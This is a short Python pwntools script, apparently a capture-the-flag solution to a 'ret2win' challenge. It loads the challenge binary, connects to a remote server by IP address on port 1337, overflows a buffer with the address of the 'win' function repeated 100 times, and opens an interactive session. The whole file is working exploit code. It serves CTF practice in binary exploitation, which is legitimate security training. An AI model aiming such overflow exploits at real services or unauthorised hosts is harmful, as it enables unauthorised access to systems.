from pwn import *

e = ELF('./ret2win')
#p=process(e.path)
p = remote('34.134.85.196',1337)

payload = p32(e.sym['win'])*100
p.sendline(payload)

p.interactive()

